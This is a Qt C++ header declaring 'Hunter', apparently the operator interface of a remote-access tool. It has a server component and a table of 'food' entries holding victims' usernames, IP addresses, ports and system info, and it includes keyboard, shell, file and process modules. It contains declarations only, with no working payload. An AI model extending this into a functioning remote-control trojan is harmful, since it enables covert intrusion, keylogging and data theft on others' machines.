#ifndef HUNTER_H
#define HUNTER_H

#include <QWidget>
#include <QDebug>
#include <QIcon>
#include <QPushButton>
#include <QSizePolicy>
#include <QMenu>
#include <QAction>
#include <QMessageBox>
#include <QInputDialog>
#include <QMovie>
#include <QList>
#include "cook.h"
#include "keybd.h"
#include "shell.h"
#include "file.h"
#include "proc.h"

QT_BEGIN_NAMESPACE
namespace Ui { class Hunter; }
QT_END_NAMESPACE

class Hunter : public QWidget
{
    Q_OBJECT

public:
    Hunter(QWidget *parent = nullptr);
    ~Hunter();

private:
    Ui::Hunter *ui;
    QMenu *mRclick; // 右键菜单
    Cook *mCook; // 服务端

public slots:

    // 添加食物列表
    void addFoodToTbl(int id, QString username, QString ipaddr, int port, QString sysInfo);
    // 删除食物
    void rmFoodFromTbl(int id);
    // 返回当前选中食物ID
    int curFoodIdInTbl();

    // 开启服务器监听
    void startLstn();

};
#endif // HUNTER_H
